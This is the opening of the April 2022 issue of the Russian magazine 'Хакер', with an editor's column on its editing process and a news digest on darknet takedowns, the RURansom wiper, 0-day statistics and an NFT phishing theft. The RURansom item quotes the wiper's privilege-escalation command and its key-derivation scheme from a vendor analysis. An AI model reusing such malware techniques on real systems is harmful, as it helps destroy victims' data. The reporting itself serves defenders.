
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                   Апрель 2022
            № 277
CONTENTS

    Как делают сардельки
  Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за апрель

    Вызов мастеру ключей
  Инжектим шелл-код в память KeePass, обойдя антивирус

    ShadowCoerce
  Как работает новая атака на Active Directory

     Herpaderping и Ghosting
  Изучаем два новых способа скрывать процессы от антивирусов

    Электронная психобумага
  Критическая уязвимость в Java позволяет подделывать электронные подписи и ключи

    Фундаментальные основы хакерства
  Ищем операнды при взломе программ

    Фундаментальные основы хакерства
  Ищем тестовые строки в чужой программе

    HTB Overow
  Упражняемся в атаке padding oracle и эксплуатируем баг в ExifTool

    HTB Toby
  Взламываем сервер через череду чужих бэкдоров

    HTB Backdoor
  Взламываем сайт на Wordpress и практикуемся в разведке

    Решетки на «Окна»
  Защищаем компьютеры с Windows 10 и особенно — с Windows 11

    Секреты PowerShell
  Пишем HTTP-запросы и парсим страницы на PowerShell

    Секреты PowerShell
  Создаем графический интерфейс для сценариев

    Музыка в пакете
  Автоматически конвертируем и аннотируем аудиофайлы в Windows

    Цифровая электроника с самого начала
  Собираем схемы на MOSFET-транзисторах

    Титры
  Кто делает этот журнал
HEADER





     Андрей Письменный
       Главный редактор
      apismenny@gmail.com  КАК
      ДЕЛАЮТ
    САРДЕЛЬКИ
                  КОЛОНКА ГЛАВРЕДА





Сегодня мы  с  тобой  будем  обсуждать  производство
нажористых,  сочных и всеми любимых  статей «Хакера»!
Почему не сарделек? Дело в том, что этот заманчивый
заголовок — лишь  перевод  английской  идиомы  «how
the sausage gets made», которая подразумевает, что раз‐
говор пойдет о какой‑то внутренней кухне.


«Ни фига себе вы заморачиваетесь!» — раз за разом слышу я от новых авто‐
ров, которые внезапно узнают, сколько нужно труда, чтобы превратить прис‐
ланный ими текст в готовую к публикации статью. Всё так: над каждым текстом
работает в среднем четыре человека, и, хоть мы и можем при необходимости
прогнать его от авторского черновика до публикации за сутки, обычно на это
уходит как минимум два‑три рабочих дня.
  По доброй традиции (которая возникла, когда нам надоело, что в редак‐
цию часто шлют черт‑те что и потом спрашивают, почему не публикуем) про‐
цесс начинается с согласования заявки. Автор пишет один абзац, где расска‐
зывает, зачем нужно будет читать статью и почему изложенное в ней интерес‐
но и полезно нашим читателям.
   Это, кстати, не напрасный труд, призванный развлечь редакторов. Такие
заявки не только помогают в обсуждении темы, но и еще идеально годятся
в качестве начала текста («лида» на профессиональном жаргоне). Читатель,
открывая статью, первым делом хочет узнать, стоит ли на нее тратить время.
Почему бы не объяснить это сразу?
   Судьба у заявки может быть разной. Бывает, что редактор сразу ее одоб‐
ряет, решив, что отказываться от такого сокровища было бы глупо. Другие
темы ждут обсуждения на  редколлегии, и  тогда автор  получает ответ
по результатам. А иногда заодно и пару ценных советов, как лучше раскрыть
тему.
   Кстати, насчет тем. Мы почти всегда даем зеленый свет текстам о прак‐
тике ИБ, если они не повторяют какой‑то из недавних материалов. Любой
хардкор и копание в подробностях мило нашим сердцам, если речь идет
о взломе. Если нет, то не обессудь — тема должна быть хоть немного
популярной и массовой, чтобы писать об этом статью в «Хакер».
   Одновременно с одобрением заявки редактор обычно спрашивает о сро‐
ке сдачи. Да‑да, мы стараемся не диктовать свои условия, и, если текст
по своей сути не суперсрочный, автор обычно назначает дедлайн сам. Одна‐
ко совсем без сроков работать нельзя: авторы так и норовят отвлечься
и позабыть об обещанном тексте. Нужно хотя бы знать, когда начинать тыкать
их палочкой!
  А еще мы решили не угнетать новых авторов требованиями к оформле‐
нию. Текст можно слать хоть в DOCX, хоть в ODT, хоть в формате маковского
Pages — мы достаточно уверенные пользователи ПК, чтобы их открыть. Хотя
если ты заготовил нам подарок в виде файла LaTeX или PDF, то все же оду‐
майся. Мы, если надо, сконвертируем и их, но уже зловеще скрежеща зубами.
  В самой редакции при этом принят формат Markdown — тот же, что
используется, например, на GitHub. Точнее, немного модифицированный —
чтобы учесть всякие фишечки вроде врезок и красиво оформленного вывода
терминала. Постоянные авторы шлют тексты именно в этом формате, чем
немало экономят силы редакторам.
   Когда заветный архив со статьей и картинками падает в почту редактору,
тот должен принять важное решение: взять статью в работу или прислать
автору еще больше ценных указаний.
   Если текст принят, то дело за редактурой. Какие‑то тексты вообще в ней
не нуждаются, и по ним достаточно лишь пройтись и пригладить последние
шероховатости. Другие статьи проходят через серьезное переписывание
с несколькими раундами уточнений у автора и доделок.
   Наша цель — сделать так, чтобы любой, даже самый сложный текст было
легко читать, причем без всякой подготовки. Конечно, с нашими темами
такой идеал недостижим, но практика показывает, что иногда достаточно
немного распутать слишком туго закрученные предложения, добавить пояс‐
нений тут и там, разбить на части с понятными названиями — и вот текст уже
заиграл новыми красками.
  Я всегда призываю редакторов быть с авторами помягче. Да, многие, если
не большинство из авторов «Хакера» воспринимали школьные уроки русского
языка как раздражающую повинность. Но редко когда человек блестяще раз‐
бирается и в сложной технической теме, и в особенностях пунктуации.
   Вообще, у меня есть теория, что хакеры — одни из самых плохих кан‐
дидатов в писатели на свете. Сочетание технической профессии и склон‐
ности к интуитивному подходу дают совершенно непредсказуемые резуль‐
таты, когда человек вдруг сталкивается с необходимостью структурировать
и зафиксировать какие‑то знания при помощи слов.
   Именно поэтому распутывать и переписывать — вечная и неизбежная
часть нашей работы, к которой мы относимся максимально спокойно. Точно
так же, как в травмпункте тебя не будут стыдить за сломанную руку, мы
не будем подтрунивать над искалеченными предложениями. В крайнем слу‐
чае вздохнем и скажем: «Эка, батенька, вас угораздило!»
   После редактуры текст обычно возвращается к автору на финальную про‐
верку. Если от приглаживания стилистики где‑то пострадал смысл, то это иде‐
альный момент, чтобы пожаловаться. В спорных ситуациях, когда редактор
хочет написать покрасивее, а автор — пусть и занудно, но точно, я рекомен‐
дую выбирать в пользу авторского варианта. Впрочем, русский язык гибок,
а ум — силен, поэтому почти всегда можно придумать вариант, который
устроит обоих. Это одна из задач редактора.
   Следом текст отправляется к корректору для финальной вычитки и устра‐
нения ошибок, пропущенных менее внимательными участниками процесса.
И наконец, приходит к выпускающему редактору. Он вносит последние кор‐
рективы в верстку, убеждается, что картинки не потерялись и крепко стоят
на своих местах, подбирает и подрезает изображение на обложку и делает
целую череду других рутинных, но необходимых дел.
  В момент, когда текст публикуется на сайте, автору на почту приходит
автоматическое оповещение, начисляется месяц бесплатной подписки (что‐
бы можно было сразу посмотреть публикацию целиком) и 33% накопительной
скидки. Вот и весь процесс!
   Как видишь, не нужно быть каким‑то особенным специалистом в написа‐
нии текстов. Главное — чтобы содержимое было интересным, а уж пок‐
расивее сформулировать мы поможем. Почти все статьи в «Хакере» написа‐
ны технарями и энтузиастами от ИБ, а не дипломированными журналистами
и литераторами.
   Если ты с интересом дочитал досюда и у тебя есть мысль написать
в «Хакер», значит, эта заметка нашла своего героя. Срочно записывай свои
мысли и шли заявку, можно прямо мне (адрес есть на странице контактов).
А еще можешь задать вопросы в комментариях или сходить и все же по‐
читать, как делают эти самые сардельки.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В  этом  месяце:   правоохранители   закрыли   «Гидру»
и RaidForums, арестовав их операторов, NFT-проект Bored
Ape Yacht Club скомпрометировали, Илон Маск купил Twitter
и отказался сотрудничать с Биллом Гейтсом, драйверы AMD
уличили в случайном разгоне процессоров, российских раз‐
работчиков блокируют на GitHub, а инженеры GitLab испра‐
вили опасный баг на своей платформе.





КРУПНЫЕ
ЛИКВИДАЦИИ
«Гидра»
В начале апреля Федеральное ведомство уголовной полиции Германии
(Bundeskriminalamt, BKA) и Центральное управление Германии по борьбе
с киберпреступностью (Zentralstelle zur Bekämpfung der Internetkriminalität, ZIT)
сообщили о ликвидации «Гидры» (Hydra Market), крупнейшей в даркнете рус‐
скоязычной торговой площадки. В ходе операции немецкие власти смогли
изъять у преступников 543 биткоина (около 25 миллионов долларов по курсу
на тот момент), а также конфисковать серверы ресурса.
  По данным властей, на момент закрытия на «Гидре» насчитывалось око‐
ло 19 тысяч зарегистрированных аккаунтов продавцов, которые обслуживали
не менее 17 миллионов клиентов по всему миру. При этом оборот Hydra
Market в 2020 году власти оценивают в 1,35 миллиарда долларов США, что
делало сайт крупнейшей торговой площадкой в даркнете.
   Согласно официальному пресс‑релизу, закрытие стало возможным после
продолжительного  расследования, направленного на ранее неизвестных
операторов и администраторов платформы. Также правоохранители отме‐
чают, что на Hydra Market работал миксер Bitcoin Bank, который скрывал все
криптовалютные транзакции, совершаемые на платформе, а это допол‐
нительно  затруднило  отслеживание  средств,  полученных  в  результате
незаконной деятельности.
  По информации блокчейн‑аналитиков из компании Elliptic, с момента сво‐
его создания в 2015 году Hydra Market была связана с криптовалютными
транзакциями на сумму более 5 миллиардов долларов.





      «Платформа специализировалась на продаже наркотиков, хотя в объ-
       явлениях на сайте также встречались поддельные документы, данные«
       (например, данные кредитных карт) и цифровые  услуги. Продукты
       рекламировались для продажи в ряде стран, таких как Россия, Укра-
       ина, Беларусь и Казахстан. Также Hydra предоставляла дополнитель-
     ные услуги, в том числе обмен криптоактивами и услуги по обналичи-
      ванию. К тому же  встроенная  биржа  торговой  площадки широко
      использовалась для отмывания средств  от  взлома  биржи  Bitfinex
      в 2016 году», — рассказали в Elliptic.                »
Вскоре после этого заявления немецких властей американские власти сооб‐
щили, что тоже участвовали в операции по закрытию Hydra Market. Тогда
как немецкие власти не производили арестов, связанных с закрытием «Гид‐
ры», а также их заявления не содержали каких‑либо имен, Министерство
юстиции США выдвинуло заочные обвинения против россиянина Дмитрия
Олеговича Павлова. Предполагаемый админ «Гидры» обвиняется в сговоре
с целью распространения наркотиков, а также сговоре с целью отмывания
денег.
   Якобы Павлов управлял серверами торговой площадки через подставную
компанию Promservice («Промсервис»), также известную как Hosting Company
Full Drive (хостинговая компания «Полный привод»),  All Wheel Drive («Все
колеса») и 4x4host.ru. Будучи администратором серверов Hydra, Павлов яко‐
бы вступил в сговор с другими операторами маркетплейса, чтобы способс‐
твовать развитию сайта, и предоставил преступникам критически важную
инфраструктуру, которая позволила Hydra работать и процветать в конкурен‐
тной среде даркнета. Утверждается, что он получил миллионы долларов
«комиссионных», содействуя работе Hydra.
   Около двух недель спустя Мещанский районный суд города Москвы арес‐
товал Дмитрия Павлова. Электронная картотека гласит:

      «Суд удовлетворил ходатайство следствия и избрал меру пресечения
      в виде заключения под стражу в отношении Павлова Д. О., который«
       проходит по делу, возбужденному по ч. 5 ст. 228.1 УК РФ („Незакон-
     ные производство, сбыт или пересылка наркотических средств, пси-
       хотропных веществ или их аналогов в особо крупном размере“)».                »
При этом в интервью BBC Павлов заявил, что узнал о происходящем из СМИ
и не имеет никакого отношения к «Гидре».

     «Мы являемся хостинг‑компанией и имеем все необходимые лицен-
      зии связи Роскомнадзора. Мы не занимаемся администрированием«
      никаких  площадок  в  принципе, а  только  предоставляем  серверы
      в аренду как посредники (перепродавая услуги). Мы не знаем, что
       у нас хостится, так как после предоставления доступа к серверу кли-
      енты меняют пароль и доступ невозможен», — рассказал Павлов жур-
       налистам и добавил, что если бы ему было известно, что именно
       находится на  серверах, то он «не  предоставил бы  оборудование
      ни под каким предлогом».                »
Кроме того, американские власти объявили, что вводят санкции в отношении
Hydra и криптовалютной биржи Garantex. Как писал в Twitter госсекретарь
США Энтони Блинкен, эти скоординированные действия «демонстрируют
наше  стремление  продолжать  разрушать  инфраструктуру и  [подрывать
работу] вымогателей».
   Garantex обвинили в содействии операциям по отмыванию денег, про‐
водившимся на  «Гидре»,  что  прямо  нарушает  существующие  правила
по борьбе с отмыванием денег и финансированием терроризма.


       «Анализ известных транзакций Garantex показывает, что транзакции
      на сумму более 100 миллионов долларов США были связаны с прес-«
       тупниками и торговыми  площадками  даркнета, в том  числе  поч-
      ти 6 миллионов долларов США связаны с российской RaaS-группиров-
      кой Conti, а также около 2,6 миллиона долларов США — с Hydra», —
       гласит заявление Министерства финансов США.                »
RaidForums
Также в этом месяце в ходе международной операции TOURNIQUET, которую
координировал   Европол,  был   закрыт  известный   хакерский  ресурс
RaidForums,  в основном  использовавшийся для  торговли  украденными
базами данных. Администратор RaidForums и двое его сообщников были
арестованы,  а  инфраструктура  сайта  перешла под  контроль  правоох‐
ранительных органов.





               «Заглушка», которая отображается по адресу RaidForums

Операцию больше года готовили власти США, Великобритании, Швеции,
Германии, Португалии и Румынии. Министерство юстиции США заявило, что
администратор  сайта, известный под ником Omnipotent, был арестован
еще 31 января 2022 года в Великобритании и ему уже предъявлены обви‐
нения. Он находился под стражей с момента ареста до завершения процеду‐
ры экстрадиции.
   Так как за псевдонимом Omnipotent скрывался 21-летний гражданин Пор‐
тугалии Диогу Сантос Коэльо (Diogo Santos Coelho), выходит, что он запустил
RaidForums, когда ему было 14 лет, так как сайт работал с 2015 года.
   Также известно, что правоохранители захватили домены, на которых раз‐
мещается RaidForums: raidforums.com, rf.ws и raid.lol.
  По статистике Министерства юстиции, в общей сложности на торговой
площадке было выставлено на продажу более 10 миллиардов уникальных
записей из сотни ворованных баз данных, в том числе затрагивающие людей,
проживающих в США. В свою очередь, Европол сообщает, что на RaidForums
насчитывалось более 500 тысяч пользователей и он был «одним из крупней‐
ших хакерских форумов в мире». Здесь  стоит добавить, что речь идет
об англоязычных ресурсах.


      «Эта торговая площадка сделала себе имя, продавая доступы к гром-
      ким  утечкам БД,  принадлежавших  различным  американским  кор-«
      порациям из разных отраслей. В них содержалась информация о мил-
      лионах  кредитных карт, номерах  банковских  счетов и маршрутной
      информации, а  также именах  пользователей и  связанных с ними
      паролях, необходимых для доступа к онлайн‑аккаунтам», — сообщает
       Европол.                »
Пока неясно, сколько времени заняло расследование, но, похоже, правоох‐
ранителям удалось составить довольно четкую картину иерархии RaidForums.
В пресс‑релизе Европола отмечается, что люди, которые поддерживали
работу RaidForums, занимались администрированием, отмыванием денег,
похищали и загружали на сайт данные, а также скупали краденую информа‐
цию.
  При  этом  упомянутый  Диогу  Сантос  Коэльо  якобы  контролировал
RaidForums с 1 января 2015 года, то есть с самого старта, и управлял сайтом
при  поддержке   нескольких   администраторов,  организовав   структуру
для продвижения покупки и продажи ворованных данных. Чтобы получать при‐
быль, форум взимал с пользователей плату за различные уровни членства
и продавал кредиты, которые позволяли участникам получать доступ к более
привилегированным областям сайта или к ворованным данным.
   Коэльо также выступал в качестве посредника и гаранта между сторонами,
совершающими сделки, обязуясь следить, чтобы покупатели и продавцы соб‐
людали соглашения.
   Интересно, что еще в феврале 2022 года преступники и ИБ‑исследова‐
тели заподозрили, что RaidForums захвачен правоохранительными органами,
так как сайт начал отображать форму входа на каждой странице. При попытке
войти на сайт тот просто снова показывал страницу входа, и многие пред‐
положили, что сайт захвачен и это фишинговая атака правоохранителей,
которые пытаются получить учетные данные злоумышленников.
   27 февраля 2022 года DNS-серверы raidforums.com и вовсе изменились
на  jocelyn.ns.cloudflare.com и  plato.ns.cloudflare.com, что  только убедило
хакеров в их правоте. Дело в том, что в прошлом эти DNS-серверы исполь‐
зовались другими сайтами, захваченными властями, включая weleakinfo.com
и doublevpn.com.


44 МИЛЛИАРДА ЗА TWITTER

Компания Twitter официально объявила о том, что принимает предложение Илона Маска,
который  покупает компанию за 44 миллиарда долларов,  чтобы  сделать ее  частной.
О желании купить Twitter Маск заговорил в начале апреля 2022 года и сообщил, что уже при‐
обрел 9% акций. Сначала Маск планировал войти в совет директоров, но потом оставил эту
идею, решил приобрести Twitter полностью, что и осуществил буквально через пару недель.


Маск заявляет, что делает это ради принципов свободы слова, которых, по его мнению, должна
придерживаться платформа. Также он обещал бороться с армиями ботов, спамом и так
называемыми теневыми банами.





RURANSOM
УНИЧТОЖАЕТ
ДАННЫЕ
РОССИЙСКИХ
КОМПАНИЙ
Специалисты VMware предупредили сообщество об активности вайпера
RURansom, который атакует российские системы и умышленно уничтожает их
данные, включая резервные копии. В отличие от обычных шифровальщиков,
которые вымогают выкуп у пострадавших, автор RURansom не просит денег,
а просто стремится причинить ущерб РФ.
  Еще в начале марта о RURansom писали аналитики компании Trend Micro,
которые предостерегали пользователей и компании об опасности нового
вайпера (wiper, от английского to wipe — «стирать», «очищать»). По информа‐
ции компании, вредонос появился еще 26 февраля и был создан как деструк‐
тивное ПО, специально нацеленное на уничтожение резервных копий и дан‐
ных жертв.
   Как теперь сообщили эксперты VMware, подготовившие собственный ана‐
лиз, вайпер написан на .NET и распространяется подобно червю, копируя
себя в виде файла с двойным расширением doc.exe на все съемные диски
и подключенные сетевые ресурсы.





После запуска на машине жертвы малварь немедленно вызывает функцию
IsRussia(), проверяя общедоступный IP-адрес системы с помощью сервиса,
расположенного по адресу https://api[.]ipify[.]org. Затем RURansom исполь‐
зует IP-адрес для определения географического местоположения машины
с помощью известной службы геолокации, используя формат URL-адреса
https://ip-api[.]com/#<публичный IP>.
   Если жертва находится не в России, малварь выводит на экран сообщение
«Программу могут запускать только российские пользователи» и прекращает
выполнение.
   Если же процесс не прерван, вредонос получает привилегии администра‐
тора с помощью cmd.exe /c powershell start-process -verb runas и приступает
к шифрованию данных. Шифрование применяется ко всем расширениям,
кроме файлов .bak, которые удаляются. Файлы шифруются с использованием
алгоритма AES-CBC с жестко запрограммированной солью и случайно сге‐
нерированным ключом длиной, равной Base64 ("FullScaleCyberInvasion
+ " + MachineName).
  При этом записка, оставленная автором малвари в коде и файле «Пол‐
номасштабное_кибервторжение.txt», гласит, что ему не нужен выкуп и он
хочет причинить ущерб России, отомстив за «специальную военную опе‐
рацию» в Украине.


      «Нет никакого способа расшифровать ваши файлы. Никакой оплаты,
       только ущерб», — заявляет разработчик в сообщении, пропущенном«
      через Google Translate.                »

0-DAY-БАГОВ ВСЕ БОЛЬШЕ
Специалисты Google Project Zero и компании Mandiant раскрыли статистику об уязвимостях
нулевого дня, обнаруженных в 2021 году. По данным аналитиков, количество случаев исполь‐
зования 0-day растет и чаще всего за такими атаками стоят китайские хакеры.

В общей сложности в 2021 году Google Project Zero было обнаружено и раскрыто 58 уязвимос‐
тей нулевого дня.





Для сравнения: в 2020 году было обнаружено только 25 0-day-эксплоитов, а предыдущий
рекорд и вовсе был установлен в 2015 году — 28 эксплоитов.

Такой прирост эксплуатируемых багов эксперты связывают с более частым обнаружением
и раскрытием уязвимостей и говорят, что хакеры «используют одни и те же шаблоны багов
и методы эксплуатации, атакуя одни и те же области».





Из 58 уязвимостей нулевого дня 39 были связаны с повреждением информации в памяти, а за
ними следуют 17 багов use after free, 6 проблем out of bounds чтения, 4 проблемы перепол‐
нения буфера и 4 бага целочисленного переполнения.

Согласно  отчету Mandiant, в прошлом году было  зарегистрировано 80  случаев исполь‐
зования 0-day-уязвимостей, что на 18 больше, чем в 2020-м и 2019 годах, вместе взятых.

Активнее всего уязвимости нулевого дня эксплуатировал Китай, на второе место Mandiant ста‐
вит Россию с двумя эксплоитами, а замыкает тройку Северная Корея с одним эксплоитом
в арсенале.





                                     Продолжение статьи →
← Начало статьи





 GOOGLE ЗАПРЕЩАЕТ
 ЗАПИСЬ ЗВОНКОВ
   Компания Google анонсировала новые правила, которые, по сути, запрещают
   приложения для записи звонков. В рамках борьбы с приложениями, которые
   злоупотребляют API-интерфейсами  Accessibility Service в Android, запись
   звонков через эти API-интерфейсы теперь будет запрещена. Дело в том, что
   API Accessibility Service — это практически единственный способ для сторон‐
   них  приложений  записывать  звонки на  Android, а  значит,  приложения
  для записи звонков теперь «вне закона».
     NLL Apps, разработчик приложения ACR Phone для записи звонков, нас‐
   читывающего более миллиона загрузок в Google Play Store, внимательно сле‐
   дит за изменениями правил Google. Он одним из первых обратил внимание,
   что страница поддержки Google Play теперь гласит: «API для специальных воз‐
   можностей не предназначен для удаленной записи звонков и не может зап‐
   рашиваться для этой цели». Новый запрет вступает в силу 11 мая 2022 года,
   то есть в день старта конференции Google I/O.
    При этом не названо никакой четкой причины, по которой Google вдруг
   запрещает запись звонков и такие приложения в Play Store. Конечно, во мно‐
   гих странах для записи звонка требуется получить согласие одного или нес‐
   кольких его участников, но, когда это требование выполнено, записывать раз‐
  говор можно абсолютно законно.
      Интересно,  что при этом  у Google не  возникает  никаких  проблем
  с записью звонков, если речь идет о ее собственных приложениях. К при‐
   меру, приложение Google Recorder — это продукт, полностью построенный
  на полезности записи звонков. Также приложение Google Phone на телефо‐
   нах Pixel поддерживает запись звонков во многих странах мира. Разработ‐
   чики сетуют, что Google просто не предоставляет им нужных API, чтобы сто‐
   ронние приложения могли конкурировать на этом рынке, а теперь ИТ‑гигант
  и вовсе закрывает остававшиеся обходные пути.
    В прошлом Google уже заявляла, что будет лучше, если API-интерфейсы
   Accessibility Service будут использоваться только приложениями, предназна‐
   ченными для людей с ограниченными возможностями. Но в силу того, что
  для многих функций попросту не существует других вариантов, не связанных
  с Accessibility Service, многие приложения все равно вынуждены использовать
   эти API-интерфейсы.
      Также в прошлом Google уже отключала приложения от API Accessibility
   Service, похоже намереваясь бороться с записью звонков, но в итоге в ком‐
  пании отказались от этих планов. В 2020 году во второй версии Android 11
   Developer    Preview   на    короткое    время   даже    появился    API
  ACCESS_CALL_AUDIO, предназначенный для записи звонков, хотя в итоге он
  не попал в релиз.
      Теперь многие журналисты и разработчики предполагают, что план выг‐
  лядел именно так: начать поддерживать запись звонков с помощью спе‐
   циального API, а через несколько лет запретить приложениям использовать
  для этих целей API Accessibility Service. Вместо этого получилось, что Google
   запрещает все приложения для записи звонков в Google Play Store, не давая
   их создателям никакой альтернативы.


  УДАЛЕНКА ДЛЯ ОСУЖДЕННЫХ
  В кулуарах стратегической конференции «Импортонезависимость», прошедшей в Новосибир‐
   ске, журналисты получили интересный комментарий от замглавы ФСИН Александра Хабарова.
   Он сообщил, что ФСИН  рассматривает возможность привлечения  IT-специалистов, отбы‐
   вающих наказание в исправительных центрах, к удаленной работе на коммерческие компании.
   Сообщается, что с такими предложениями к ведомству обратились в ряде регионов России.





             «Таких специалистов не так много. К нам с этой инициативой выходят в ряде →           территорий, в ряде  субъектов  предприниматели, которые в этой области
           работают. Мы только на начальном этапе. Если это востребовано, а это, скорее
             всего, востребовано, думаем, что мы специалистов в этой области не будем
           заставлять работать на каких‑то других производствах»,


  — сообщил Хабаров.





 АВТОРОВ BESA MAFIA
 ПОЙМАЛИ
   Румынская полиция арестовала пятерых мужчин, стоявших за самым извес‐
  тным сайтом заказных убийств в даркнете, который носил имена Besa Mafia,
  Camorra Hitman, а с недавних времен — Hitman Marketplace № 1. По сути,
  ресурс был фальшивкой, никаких киллеров администраторы сайта не знали
  и не  нанимали, но это не мешало им брать за поиск исполнителей
   от 5 до 20 тысяч долларов в биткоинах.
     Сайт был создан еще в 2010-х и якобы предлагал посетителям площадку
  для поиска исполнителей заказных убийств. Пользователей просили предос‐
   тавить данные о цели, информацию о том, как и когда должно произойти
   убийство, а затем просили оплатить «комиссию» в биткоинах.
    С самого начала было ясно, что сайт, скорее всего, мошеннический, но за
   долгие годы его работы администрация приняла тысячи заказов и нашла
  себе множество платных клиентов. Мужья заказывали убийства своих жен,
  деловые партнеры искали убийц для коллег, человек, потерявший деньги
  на сайте спортивных ставок, попросил убить представителя службы поддер‐
   жки, который отказался помочь вернуть средства, нашелся даже тот, кто
   заказал убийство 14-летнего подростка.
     Многие подробности о Besa Mafia стали известны еще в 2016 году, когда
   сайт взломали, а информация о пользователях сайта и их заказах стала дос‐
  тоянием общественности. Напомню, что тогда ресурс заявлял, будто связан
  с албанской мафией.





  Как сообщило теперь Румынское управление по расследованию организо‐
   ванной преступности и терроризма (DIICOT), рейды и задержания были про‐
   ведены по  запросу  американских  властей. Министерство национальной
   безопасности США и ФБР много лет расследовали дела, связанные с этим
   ресурсом. Как пишет DIICOT:

          «Власти США установили, что эта группа состоит из пяти или более
         лиц,  находящихся  на  территории  Румынии,  и  координированно «
          управляет этими сайтами и отмывает деньги, полученные в результате
           подстрекательств к убийствам».                 »
  В итоге операции были задержаны пять человек и четыре свидетеля.
     ИБ‑эксперт Кристофер Монтейро (Christopher Monteiro) детально изучал
   активность Besa Mafia еще в 2016 году и посвятил этому серию статей в сво‐
  ем блоге — и настолько разозлил администраторов сайта, что они угрожали
  ему лично. В те годы Монтейро писал, что Besa Mafia — это мошенничество
  и в какой‑то мере городская легенда. Однако пользователи сайта относились
   к своим «заказам» серьезно, действительно хотели причинить другим людям
   реальный вред, и эксперт долго пытался предупредить об этой опасности
   власти.
     К сожалению,  правоохранители всерьез занялись Besa Mafia  только
   в 2020-х. В итоге, по оценке Монтейро, с тех пор было арестовано око‐
  ло 25 заказчиков, однако администрация сайта до недавнего времени оста‐
  валась неуловимой.
    В течение многих лет властям было неизвестно, кто стоит за Besa Mafia,
   так как за все контакты с пользователями отвечал некто «Юра» (Yura). Он
  общался с людьми, которые задавали вопросы об услугах киллеров, побуж‐
  дал их делать заказы и на ломаном английском старался развеять все их опа‐
   сения. Опираясь на логи таких чатов, власти предполагали, что он проживает
   в Восточной Европе (скорее всего, в Румынии).
      Даже сейчас, после всех арестов и обысков, неясно, была ли Besa Mafia
  детищем одного человека, который развил свой «бизнес» до такой степени,
   что ему потребовалась поддержка целой команды, или за сайтом всегда сто‐
  яла некая группировка.
     DIICOT сообщает, что ущерб от работы Besa Mafia оценивается примерно
   в 500 тысяч евро, но, если бы мошенники хранили биткоины, полученные
   в 2016 году, вероятно, сегодня те стоили бы гораздо больше.
      Упомянутый Кристофер Монтейро, который годами пытался привлечь вни‐
  мание к проблеме Besa Mafia, отнесся к новости о возможном задержании
  «Юры» неоднозначно.

        «Хорошо, что международная операция правоохранительных органов
          привела к задержанию этих  преступников, но  начнут ли они  ког- «
         да‑нибудь активное расследование по тысячам имен из „списка смер-
          тников“?» — комментирует исследователь.                 »

  ДЕНЬГИ REVIL

    Заместитель министра внутренних дел РФ — начальник Следственного департамента МВД Сер‐
   гей Лебедев рассказал, что у участников REvil, арестованных в январе текущего года, были
   изъяты огромные суммы денег: более 300 миллионов рублей, 950 тысяч долларов, свы‐
  ше 1 миллиона евро, флеш‑накопитель с 19,9 биткоина.

  Об аресте 14 человек, связанных с REvil, ФСБ объявила в середине января 2022 года. Тогда
   обыски и аресты прошли по 25 адресам в Москве, Санкт‑Петербурге, Ленинградской и Липец‐
   кой областях.

  В настоящее время следователи уже провели более 50 допросов и 26 обысков, также про‐
   водится 16 технико‑криминалистических и компьютерных судебных экспертиз.





 BORED APE YACHT
 CLUB ВЗЛОМАЛИ
   Хакеры  неизвестным  образом  скомпрометировали  Instagram-аккаунт*
  и Discord-сервер известного NFT-проекта Bored Ape Yacht Club. Злоумыш‐
   ленники распространили среди подписчиков рекламу фейкового airdrop’а
  с вредоносной ссылкой и в итоге похитили NFT общей стоимостью око‐
  ло 3 миллионов долларов.
      Представители компании Yuga Labs, стоящей за Bored Ape Yacht Club,
  сообщили о взломе в официальном Twitter.

         «Похоже,   что   Instagram*  BAYC   взломан.   Никакого   минтинга,
        не нажимайте на ссылки и не связывайте свой кошелек ни с чем», — «
          предупредили в Yuga Labs.                 »
   Через взломанные аккаунты хакеры анонсировали фейковый airdrop, соп‐
  роводив рекламу вредоносной ссылкой, переходя по которой люди попадали
  на фишинговый сайт, внешне имитирующий официальный сайт Bored Ape
   Yacht Club, где в итоге передавали контроль над своими кошельками зло‐
   умышленникам.
      Интересно, что в Yuga Labs уверяют, что для взломанных учетных записей
  была включена двухфакторная аутентификация и меры безопасности в целом
  «были жесткими». В настоящее время ведется расследование случившегося,
  но пока  совершенно  неясно, каким  образом  злоумышленники  смогли
   получить доступ к аккаунтам проекта.
    По данным OpenSea, после взлома владельцев сменили 24 NFT из кол‐
  лекции Bored Apes и 30 из Mutant Apes. Впрочем, отмечается, что некоторые
   держатели NFT могли сами передать токены другим лицам из соображений
   безопасности. Стоимость этих 54 NFT составляет примерно 13,7 миллиона
   долларов.
      Независимый  исследователь  Zachxbt  и  вовсе  поделился  ссылкой
  на Ethereum-адрес хакера, в настоящее время помеченный как фишинговый
  на Etherscan. Судя по всему, за несколько часов на этот адрес поступили сра‐
   зу 134 NFT.
    В  Yuga  Labs  заявляют,  что  пострадавших было  намного  меньше.
  По информации компании, в ходе атаки были украдены 4 NFT Bored Apes, 6
   Mutant Apes и 3 BAKC, общая стоимость которых равна приблизитель‐
  но 2,7 миллиона долларов.


        «Я только что потерял на этом более 100 эфиров. *** неприемлемо.
         [Это был] официальный  инстаграм*, и сайт  выглядел настоящим. «
         Теперь я нахожусь в ситуации,  когда мне  придется подать в суд
         на Yuga из‑за этого взлома. Я не откажусь от своих 300 тысяч дол-
         ларов, потому что их дерьмо взломали», — пишет один из пострадав-
         ших.


         «Это как наблюдать за группой людей, которая вбегает в горящее
          здание, на котором написано „бесплатные деньги“», — злорадствуют
          другие пользователи.                 »
   * Заблокирован в России, принадлежит компании Meta, признанной экстре‐
   мистской организацией, запрещенной на территории РФ.


  DDOS’ИТЬ РОССИЮ СТАЛИ ЧАЩЕ
  В марте 2022 года исследователи «Лаборатории Касперского» зафиксировали на 54% больше
    атак, чем в феврале текущего года. По сравнению с мартом 2021 года атак стало почти в 8 раз
   больше.


